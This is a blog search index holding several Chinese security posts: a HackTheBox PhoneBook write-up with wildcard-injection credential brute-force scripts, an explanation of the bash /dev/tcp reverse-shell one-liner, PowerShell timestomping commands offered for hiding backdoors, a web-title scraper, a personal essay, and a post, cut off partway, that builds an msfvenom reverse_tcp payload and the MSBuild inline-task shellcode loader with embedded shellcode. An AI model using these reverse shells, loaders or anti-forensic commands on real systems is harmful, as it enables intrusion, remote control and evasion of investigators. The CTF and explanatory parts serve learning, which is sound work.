<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox PhoneBook WriteUP</title>
      <link href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/"/>
      <url>/2023/08/22/HackTheBox_PhoneBook_WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/image-1.png" alt="Who is lucky enough to be included in the phonebook?"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目给出的网页是这样</p><p><img src="/image-2.png" alt="index"></p><p>看到HTML中有这样一段代码，还以为这题是个DOM XSS(事实上也确实有XSS)</p><pre><code class="HTML">&lt;script&gt;  const queryString = window.location.search;if (queryString) &#123;  const urlParams = new URLSearchParams(queryString);  const message = urlParams.get(&#39;message&#39;);  if (message) &#123;    document.getElementById(&quot;message&quot;).innerHTML = message;    document.getElementById(&quot;message&quot;).style.visibility = &quot;visible&quot;;    &#125;  &#125;&lt;/script&gt;</code></pre><p>但是XSS是需要人触发的，题目中并没有给出任何BOT的信息。</p><p>所以最终的解法要落在登录功能上。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>登录功能可以通过通配符<code>*</code>进入，登录成功之后是一个只有搜索框的页面（这里忘记截图了）。搜索功能可以找到若干账户的信息。</p><p><img src="/image-3.png" alt="搜索"></p><p>题目的提示是：<code>Who is lucky enough to be included in the phonebook?</code>，所以我们应该想办法获取能登录的账号密码。</p><p>登录功能可以识别通配符，所以直接写脚本遍历就好了。</p><blockquote><p>userbrute.py</p></blockquote><pre><code class="python">import requestsurl = &quot;http://157.245.43.189:30403/login&quot;value = &#39;&#39;flag = Truewhile(flag):    flag = False    for i in range(33,126,1):        if(chr(i)==&#39;*&#39;):            continue        uname = value + chr(i) + &#39;*&#39;        data = &#123;&quot;username&quot;: uname, &quot;password&quot;: &quot;*&quot;&#125;        resp = requests.post(url, data=data, allow_redirects=False)        print(uname+&#39;\t&#39;+str(resp.status_code))        if(resp.status_code != 302):            continue        if(resp.headers[&#39;Location&#39;] == &#39;/&#39;):            value = value+chr(i)            print(value)            flag = True            break</code></pre><blockquote><p>passbrute.py</p></blockquote><pre><code class="python">import requestsurl = &quot;http://157.245.43.189:30403/login&quot;value = &#39;&#39;flag = Truewhile(flag):    flag = False    for i in range(33,126,1):        if(chr(i)==&#39;*&#39;):            continue        password = value + chr(i) + &#39;*&#39;        data = &#123;&quot;username&quot;: &quot;REESE&quot;, &quot;password&quot;: password&#125;        resp = requests.post(url, data=data, allow_redirects=False)        # print(password+&#39;\t&#39;+str(resp.status_code))        if(resp.status_code != 302):            continue        if(resp.headers[&#39;Location&#39;] == &#39;/&#39;):            value = value+chr(i)            print(value)            flag = True            break</code></pre><p>取得flag：</p><p><img src="/image-4.png" alt="flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><del>真正的解题思路是看了别人的writeup才明白的，通配符这是真没想到……</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Linux下反弹Shell命令的解释</title>
      <link href="/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/"/>
      <url>/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<p>Linux下反弹shell最常用的一句命令：</p><pre><code class="shell">bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.1.1/1337 &lt;&amp;1&#39;</code></pre><p>对这条命令的理解，以我个人经历而言，大概分为几个阶段</p><ol><li>知道怎么用，但是记不住，用的时候就百度；</li><li>大概背过了，也能理解命令某些部分的含义，但仍然不清不楚；</li><li>完全理解了命令的每一部分的含义，可以脱离死记硬背，并写出不同形式的命令；</li></ol><p>说来惭愧，入行多年了，今天才完成第三步，这里仅作一次记录。<br>详细原理三言两语较难说清，这里简单提炼一下主要知识点。</p><hr><p>前置理论：</p><ol><li><strong>Linux下的一切都是文件</strong>；</li><li>Linux中的文件描述符：</li></ol><ul><li>标准输入 - 0 （默认设备键盘）</li><li>标准输出 - 1 （默认设备显示器）</li><li>错误输出 - 2 （默认设备显示器）</li></ul><ol start="3"><li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令。</li></ol><hr><p>那么，下面简单拆解一下反弹shell的命令<br><code>bash -c</code>：不解释了；<br><code>bash -i</code>：表示启动一个交互式的Shell；<br><code>&amp;&gt;</code>：表示将所有输出重定向；<br><code>/dev/tcp/ip/port</code>：表示目标的地址*(Linux下一切皆是文件)*；<br><code>&lt;&amp;1</code>：表示将标准输入重定向至标准输出的目标；</p><p>简而言之，<code>&amp;&gt;</code>实现了命令输入在攻击端完成，<code>&lt;&amp;1</code>实现了命令结果输出在攻击端。</p><hr><p>参考资料：</p><ul><li><a href="https://item.jd.com/12443890.html">《鸟哥的Linux私房菜》</a></li><li><a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向</a></li><li><a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux 反弹shell（二）反弹shell的本质</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Powershell修改文件/文件夹时间属性</title>
      <link href="/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/"/>
      <url>/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>后门隐藏</li><li>蜜罐搭建</li><li>钓鱼&#x2F;水坑攻击</li></ul><h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><h3 id="单文件时间属性修改"><a href="#单文件时间属性修改" class="headerlink" title="单文件时间属性修改"></a>单文件时间属性修改</h3><pre><code class="powershell">#最后访问时间$(Get-Item &quot;C:/path/to/yourfile&quot;).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)#最后保存时间$(Get-Item &quot;C:/path/to/yourfile&quot;).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)#文件创建时间$(Get-Item &quot;C:/path/to/yourfile&quot;).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)</code></pre><h3 id="多文件时间属性批量修改"><a href="#多文件时间属性批量修改" class="headerlink" title="多文件时间属性批量修改"></a>多文件时间属性批量修改</h3><pre><code class="powershell">#当前目录所有文件及文件夹时间属性修改foreach($n in $(Get-ChildItem).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#仅修改当前目录文件的时间属性（不包含文件夹）foreach($n in $(Get-ChildItem -File).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#仅修改当前目录文件夹的时间属性（不包含文件）foreach($n in $(Get-ChildItem -Directory).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#修改当前目录下所有文件及文件夹的时间属性（包括子文件夹）foreach($n in $(Get-ChildItem -Recurse).FullName)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#将当前目录下所有文件及文件夹时间属性设置为随机时间#示例时间随机范围为2019/1/2至操作系统当前时间foreach($n in $(Get-ChildItem -Recurse).FullName)&#123;$(Get-Item $n).LastAccessTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)$(Get-Item $n).LastWriteTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)$(Get-Item $n).CreationTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)&#125; </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CheckList </tag>
            
            <tag> 欺骗 </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个Get-Title的自我修养</title>
      <link href="/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/"/>
      <url>/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要整理大量的网页资料，刚好完善一下以前写的get-title脚本。<br>目标：获取所有URL对应网页的Title，并以友好的格式输出至文件。<br>此脚本原来是渗透的时候搞网段用的，把扫出来的Web的title列举出来，从而对自己的目标有个大致的概念。但是早先的版本只能说是可以将就着用，往往输出的格式乱七八糟，刚好借着这次机会重写一下。也顺便将其从python2过渡到python3。</p><h1 id="0x01-版本对比"><a href="#0x01-版本对比" class="headerlink" title="0x01 版本对比"></a>0x01 版本对比</h1><p>早期版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupfrom threading import Threadfrom Queue import Queueimport sysimport timeimport signalimport chardetdef getTitle(line):    try:        line=line.strip()        re = requests.get(line, timeout=2)        ret2.write(line + &#39;\n&#39;)        print line+&#39;\t\t&#39;+str(re.status_code)        if re.status_code==200:            text=BeautifulSoup(re.content,&#39;html.parser&#39;)            titles=text.find(&#39;title&#39;)            title=str(titles)            ret.write(line+&#39;\t\t&#39;+title+&#39;\n&#39;)        else:            ret.write(line + &#39;\t\t&#39; + &#39;Error Code:&#39; + re.status_code + &#39;\n&#39;)    except requests.exceptions.Timeout:        ret2.write(line + &#39;\terror\n&#39;)        print line+&#39;\t\ttime out&#39;        ret.write(line+&#39;\t\t&#39;+ &#39;Time out\n&#39;)class Worker(Thread):    def __init__(self, taskQueue):        Thread.__init__(self)        self.setDaemon(True)        self.taskQueue = taskQueue        self.start()    def run(self):        while 1:            try:                callable, args, kwds = self.taskQueue.get(block=False)                callable(*args, **kwds)            except:                breakclass ThreadPool:    def __init__(self):        self.threads = []        self.taskQueue = Queue()        self.threadNum = num_thread        self.__create_taskqueue()        self.__create_threadpool(self.threadNum)    def __create_taskqueue(self):        f = open(&quot;target.txt&quot;, &#39;r&#39;)        lines = f.readlines()        for line in lines:            self.add_task(getTitle, line)        f.close()    def __create_threadpool(self, threadNum):        for i in range(threadNum):            thread = Worker(self.taskQueue)            self.threads.append(thread)    def add_task(self, callable, *args, **kwds):        self.taskQueue.put((callable, args, kwds))    def new_complete(self):        while 1:            time.sleep(0.1)            alive = False            for i in range(num_thread):                alive = alive or self.threads[i].isAlive()            if not alive:                breakdef handler(signum, frame):    global is_exit    print &quot;CTRL+C Is Pressed&quot;    sys.exit(0)if __name__ == &#39;__main__&#39;:    num_thread = 20    signal.signal(signal.SIGINT, handler)    signal.signal(signal.SIGTERM, handler)    ret = open(&quot;titles.txt&quot;, &quot;w&quot;)    ret2=open(&quot;test.txt&quot;,&#39;w&#39;)    tp = ThreadPool()    tp.new_complete()    ret.close()    ret2.close()</code></pre><p>重写极简版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupres=requests.get(url)soup=BeautifulSoup(res.text,&#39;html.parser&#39;)print(soup.title.string)</code></pre><p>最终版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupimport threadpoolimport refrom signal import signal, SIGINTfrom sys import exitproxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;&#125;threads=30timeout=3def handler(signal_received, frame):    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)    exit(0)def get_urllist(file):    with open(file,&#39;r&#39;) as target:        targets=target.readlines()        return targetsdef get_title(url):    headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;    try:        res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)    except :        return &#39;Timeout&#39;    if res.apparent_encoding != None:        response=res.content.decode(res.apparent_encoding)    else:        response=res.text    try:        if &#39;mp.weixin.qq.com&#39; in url:            rule=r&quot;var msg_title = &#39;.*&#39;&quot;            title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)        else:            soup=BeautifulSoup(response,&#39;html.parser&#39;)            if soup.title:                title=str(soup.title.string)            else :                title=&#39;&#39;    except Exception as e:        print(e)        exit(0)    return titledef single_thread(url):    url=url.strip(&#39;\r\n&#39;)    result=url + &#39;\t&#39; + str(get_title(url))    print(result)    with open(&#39;result.txt&#39;,&#39;a+&#39;,encoding=&#39;utf-8&#39;) as output:        output.write(result+&#39;\n&#39;)if __name__ == &#39;__main__&#39;:    signal(SIGINT, handler)    target=get_urllist(&#39;target.txt&#39;)    pool = threadpool.ThreadPool(threads)    threading=threadpool.makeRequests(single_thread,target)    [pool.putRequest(req) for req in threading]    pool.wait()</code></pre><p>简而言之，早期的版本与当前版本区别如下：</p><ul><li>利用多线程的方式有所区别</li><li>解决了不同网页编码格式不同的问题</li><li>增加了代理选项</li><li>解决了微信公众还title爬取不到的问题</li><li>解决一些其他的小BUG</li><li>一些使用体验上的优化</li></ul><h1 id="0x02-探索历程"><a href="#0x02-探索历程" class="headerlink" title="0x02 探索历程"></a>0x02 探索历程</h1><p>早期的版本实际上是直接对其他大佬的代码做的修改，仅仅在使用习惯上做了一些调整，代码逻辑也不甚了解，于是一不做二不休，从零开始重写脚本。</p><h2 id="坑1-微信公众号文章的Title"><a href="#坑1-微信公众号文章的Title" class="headerlink" title="坑1 微信公众号文章的Title"></a>坑1 微信公众号文章的Title</h2><p>最早用极简版测试的时候，发现所有的微信公众号都无法用bs4直接获取到title，于是乎瞅了一眼公众号的源码，title竟然是这个屌样子的……</p><pre><code class="html">&lt;script&gt;    …………    var hd_head_img = &quot;http://xxxxxxxxxx/&quot;||&quot;&quot;;    var ori_head_img_url = &quot;http://xxxxxxxxx/&quot;;    var msg_title = &#39;这里是title&#39;.html(false);    var msg_desc = &quot;XXXXXXXXXX...&quot;;    var msg_cdn_url = &quot;http://XXXXXX/...&quot;;     …………&lt;/script&gt;</code></pre><p>丧心病狂啊……这操作我没太看明白，防爬？</p><p>想多了吧。</p><p>直接正则一把梭：</p><pre><code class="python">if &#39;mp.weixin.qq.com&#39; in url:    rule=r&quot;var msg_title = &#39;.*&#39;&quot;    title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)</code></pre><h2 id="坑2-没有Title"><a href="#坑2-没有Title" class="headerlink" title="坑2 没有Title"></a>坑2 没有Title</h2><p>有些链接是文件的下载链接，没有Title，于是引发bs4报错，于是引发脚本崩溃，这……</p><pre><code class="python">soup=BeautifulSoup(response,&#39;html.parser&#39;)if soup.title:    title=str(soup.title.string)else :    title=&#39;&#39;</code></pre><h2 id="坑3-User-Agent被拦截"><a href="#坑3-User-Agent被拦截" class="headerlink" title="坑3 User-Agent被拦截"></a>坑3 User-Agent被拦截</h2><p>有的防护设备居然会丧心病狂的拦截requests的UA……</p><pre><code class="python">headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;try:    res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)except :    return &#39;Timeout&#39;</code></pre><h2 id="坑4-编码问题"><a href="#坑4-编码问题" class="headerlink" title="坑4 编码问题"></a>坑4 编码问题</h2><p>这其实是个挺头疼的问题，之前第一版的脚本就一直没有解决。<br>以前读取<code>response</code>的内容，一般是通过两个方式，<code>res.text()</code>或者<code>res.content()</code>。但是这样有一个很头疼的问题，就是每个网站的编码方式不一样，尤其中文网站，用<code>GBK</code>的和用<code>UTF-8</code>的网站几乎一样多。于是输出的时候就是各种乱七八糟的乱码，而一个文件又不可能同时有两种编码格式。<br>经过艰(qing)难(jiao)研(da)究(lao)，最终确定了两种解决方案：</p><ol><li>通过<code>chardet</code>确定编码格式，最终统一成同一种编码方式；</li><li>读取网页<code>response</code>头中的编码格式，然后decode；</li></ol><p>最终我采用的是方案2：</p><pre><code class="python">response = res.content.decode(res.apparent_encoding)</code></pre><p>这里又有一个小坑，有些网站的response头中不会返回编码格式……</p><p>这类网站往往都是默认采用<code>UTF-8</code>格式编码，所以我们直接用<code>res.text</code>就可以了：</p><pre><code class="python">if res.apparent_encoding != None:    response=res.content.decode(res.apparent_encoding)else:    response=res.text</code></pre><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这次脚本的编写还算比较顺利（毕竟是个很简单的东西），从开始到调试、完工也不过花了两个多小时，还不如写这篇文章花的时间多，大部分时间都花在了滤坑上面。但是其实还是可以分析出一些东西，一是本人确实久疏战阵，不太熟练了；二来，即便比早先的版本改进了一些，但距离作为一个成熟的工具，仍有许多可以改进的地方。</p><h2 id="仍然存在的缺陷"><a href="#仍然存在的缺陷" class="headerlink" title="仍然存在的缺陷"></a>仍然存在的缺陷</h2><ol><li>遭遇某些编码格式的网站时，仍然会报错（如<code>cp1254</code>等）；</li></ol><pre><code class="python">  File &quot;.\get-title.py&quot;, line 28, in get_title    response=res.content.decode(res.apparent_encoding)  File &quot;C:\Environment\Python38\lib\encodings\cp1254.py&quot;, line 15, in decode    return codecs.charmap_decode(input,errors,decoding_table)</code></pre><ol start="2"><li>对于一些比较常见的反爬虫手段，无能为力（爬到的title是<code>Just a moment...</code>，说明在自动验证是否真人访问）</li></ol><h2 id="可以改进的方向"><a href="#可以改进的方向" class="headerlink" title="可以改进的方向"></a>可以改进的方向</h2><ol><li>增加代理池模式，用以解决部分网站TimeOut的问题；</li><li>更加友好的结果呈现，可输出至Excel表格中，最好舍弃csv采用xlsx，因为获取的title千奇百怪，可能破坏csv的格式；</li><li>自动识别一些常见的中间件，如Weblogic等等；</li></ol><h1 id="0x04-2021-2-26更新"><a href="#0x04-2021-2-26更新" class="headerlink" title="0x04 2021.2.26更新"></a>0x04 2021.2.26更新</h1><pre><code class="python">import requestsfrom bs4 import BeautifulSoupimport threadpoolimport refrom signal import signal, SIGINTfrom sys import exitfrom sys import argvuse_proxy=Trueproxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;,&#39;https&#39;:&#39;http://127.0.0.1:10809&#39;&#125;# proxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;&#125;threads=30timeout=10result_encode_type=&#39;gb18030&#39;def handler(signal_received, frame):    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)    exit(0)def get_urllist(file):    with open(file,&#39;r&#39;) as target:        targets=target.readlines()        return targetsdef get_title(url):    if &#39;http&#39; not in url:        url = &#39;http://&#39;+url    headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;    try:        if use_proxy:            res = requests.get(url,headers=headers,proxies=proxies,timeout=timeout)        else:            res = requests.get(url,headers=headers,timeout=timeout)    except Exception as e:        print(e)        return &#39;Timeout&#39;    if res.apparent_encoding != None:        try:            encode_type=res.apparent_encoding            response=res.content.decode(encode_type)        except:            print(&quot;#Warning# Can&#39;t decode string as 【%s】.Target URL is 【%s】.&quot; % (res.apparent_encoding,url))            response=res.text    else:        response=res.text    try:        if &#39;mp.weixin.qq.com&#39; in url:            rule=r&quot;var msg_title = &#39;.*&#39;&quot;            title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)        else:            soup=BeautifulSoup(response,&#39;html.parser&#39;)            if soup.title:                title=str(soup.title.string)            else :                title=&#39;&#39;    except Exception as e:        print(e)        exit(0)    return title.strip(&#39;\r\n&#39;)def single_thread(url):    url=url.strip(&#39;\r\n&#39;)    if not url:        return    result=&#39;&quot;&#39;+url + &#39;&quot;,&quot;&#39; + str(get_title(url))+&#39;&quot;&#39;    print(result)    with open(&#39;result.csv&#39;,&#39;a+&#39;,encoding=result_encode_type) as output:        output.write(result+&#39;\n&#39;)if __name__ == &#39;__main__&#39;:    if len(argv)!=2:        print(&#39;Usage:\n  python3 get-title.py [targetfile]&#39;)        exit()    target_file=argv[1]    signal(SIGINT, handler)    target=get_urllist(target_file)    pool = threadpool.ThreadPool(threads)    threading=threadpool.makeRequests(single_thread,target)    [pool.putRequest(req) for req in threading]    pool.wait()    </code></pre><ul><li>优化了输出方式，改为输出到CSV表格；</li><li>修正了爬HTTPS会出现问题的BUG，这么明显的BUG一开始的时候居然没发现……</li><li>修正了部分网站爬取时编码问题异常的BUG；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 - 2021</title>
      <link href="/2021/01/01/2020-2021/"/>
      <url>/2021/01/01/2020-2021/</url>
      
        <content type="html"><![CDATA[<p>总结一下吧。</p><p>2020年是很浑浊的一年，直到昨晚跨年的时候我还是很懵逼，潜意识还完全没意识到2020年就这么过去了。</p><p>这一年发生了很多的事情，对我个人而言，对这个世界而言，都是如此。这中间的共同点是，似乎没有什么事情是比较完满的。但这一篇并不是回忆录，所以我也不打算像收拾抽屉一样把它们一件一件堆叠起来。捡一些想说的说吧。</p><hr><hr><p>说起来，当初选择网络安全方向的初衷，其实是希望学习一些黑客技术，以便能够看到屏闭了我的妹子的QQ空间。</p><p>这个目标至今没有达成。</p><p>而且时过境迁，现在也没有多少人玩QQ了。</p><hr><p>意识到这个目标成为泡影之后，我想过很多次，为什么要留在这个行业。答案是，因为兴趣。</p><p>这是一个仅仅通过技术，就可以获得最原始、最纯粹的成就感的行业。信息安全是一个很广袤的定义，从开锁、到欺骗、到0Day，好像什么东西都能涵盖到信息安全的定义里面，你可以很轻易地在里面找到你感兴趣的东西。而我本人，正如<a href="https://7mitu.github.io/about/">个人描述</a>里说的那样，喜欢每个技能都点一下，传统功夫讲究点到为止（不是）。</p><hr><p>这一年来其实很苦恼，我目前的技术水平也就算个T，但是周围所有人好像都在谈APT。</p><p>饶是我这钛合金脸皮也遭不住天天面部刮痧呀。</p><hr><p>希望2021年：</p><ul><li>疫情早日结束</li><li>找到自己想要的是什么</li><li>钻研技术</li><li>远离一些虚伪</li><li>找个女朋友</li></ul><hr><p>以上。</p><p><img src="/2021/01/01/2020-2021/backiee-114501.jpg" alt="backiee-114501"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用.Net Framework加载Shellcode</title>
      <link href="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/"/>
      <url>/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-场景"><a href="#0x00-场景" class="headerlink" title="0x00 场景"></a>0x00 场景</h3><ul><li>Windows操作系统</li><li>存在.Net Framework环境</li><li>无法上传exe等可执行文件</li></ul><h3 id="0x01-生成载荷"><a href="#0x01-生成载荷" class="headerlink" title="0x01 生成载荷"></a>0x01 生成载荷</h3><p>这里以MSF Meterpreter载荷为例，首先生成Shellcode：</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=2333 -f csharp</code></pre><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133105384.png" alt="image-20201228133105384"></p><p>制作MSBuild载荷，将生成的Shellcode粘贴在下方代码的<code>shellcode</code>变量中，并保存为文件<code>bad.xml</code>：</p><pre><code class="xml">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;         &lt;!-- This inline task executes shellcode. --&gt;         &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;         &lt;!-- Save This File And Execute The Above Command --&gt;         &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;         &lt;!-- License: BSD 3-Clause --&gt;      &lt;Target Name=&quot;Hello&quot;&gt;        &lt;ClassExample /&gt;      &lt;/Target&gt;      &lt;UsingTask        TaskName=&quot;ClassExample&quot;        TaskFactory=&quot;CodeTaskFactory&quot;        AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;        &lt;Task&gt;                  &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;          &lt;![CDATA[        using System;        using System.Runtime.InteropServices;        using Microsoft.Build.Framework;        using Microsoft.Build.Utilities;        public class ClassExample :  Task, ITask        &#123;                   private static UInt32 MEM_COMMIT = 0x1000;                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;                    [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);                    [DllImport(&quot;kernel32&quot;)]            private static extern IntPtr CreateThread(                        UInt32 lpThreadAttributes,            UInt32 dwStackSize,            UInt32 lpStartAddress,            IntPtr param,            UInt32 dwCreationFlags,            ref UInt32 lpThreadId                       );          [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 WaitForSingleObject(                       IntPtr hHandle,            UInt32 dwMilliseconds            );                    public override bool Execute()          &#123;            //replace with your own shellcode            byte[] shellcode = new byte[] &#123; 0x33,0xc9,0x83,0xe9,0xaa,0xe8,0xff,0xff,0xff,0xff,0xc0,0x5e,0x81,0x76,0x0e,0x1c,0xb8,0xf2,0x6e,0x83,0xee,0xfc,0xe2,0xf4,0xe0,0x50,0x70,0x6e,0x1c,0xb8,0x92,0xe7,0xf9,0x89,0x32,0x0a,0x97,0xe8,0xc2,0xe5,0x4e,0xb4,0x79,0x3c,0x08,0x33,0x80,0x46,0x13,0x0f,0xb8,0x48,0x2d,0x47,0x5e,0x52,0x7d,0xc4,0xf0,0x42,0x3c,0x79,0x3d,0x63,0x1d,0x7f,0x10,0x9c,0x4e,0xef,0x79,0x3c,0x0c,0x33,0xb8,0x52,0x97,0xf4,0xe3,0x16,0xff,0xf0,0xf3,0xbf,0x4d,0x33,0xab,0x4e,0x1d,0x6b,0x79,0x27,0x04,0x5b,0xc8,0x27,0x97,0x8c,0x79,0x6f,0xca,0x89,0x0d,0xc2,0xdd,0x77,0xff,0x6f,0xdb,0x80,0x12,0x1b,0xea,0xbb,0x8f,0x96,0x27,0xc5,0xd6,0x1b,0xf8,0xe0,0x79,0x36,0x38,0xb9,0x21,0x08,0x97,0xb4,0xb9,0xe5,0x44,0xa4,0xf3,0xbd,0x97,0xbc,0x79,0x6f,0xcc,0x31,0xb6,0x4a,0x38,0xe3,0xa9,0x0f,0x45,0xe2,0xa3,0x91,0xfc,0xe7,0xad,0x34,0x97,0xaa,0x19,0xe3,0x41,0xd0,0xc1,0x5c,0x1c,0xb8,0x9a,0x19,0x6f,0x8a,0xad,0x3a,0x74,0xf4,0x85,0x48,0x1b,0x31,0x1a,0x91,0xcc,0x00,0x62,0x6f,0x1c,0xb8,0xdb,0xaa,0x48,0xe8,0x9a,0x47,0x9c,0xd3,0xf2,0x91,0xc9,0xd2,0xf8,0x06,0xdc,0x10,0xa4,0xeb,0x74,0xba,0xf2,0x67,0x01,0x31,0x14,0x3e,0x4c,0xe8,0xa2,0x2e,0x4c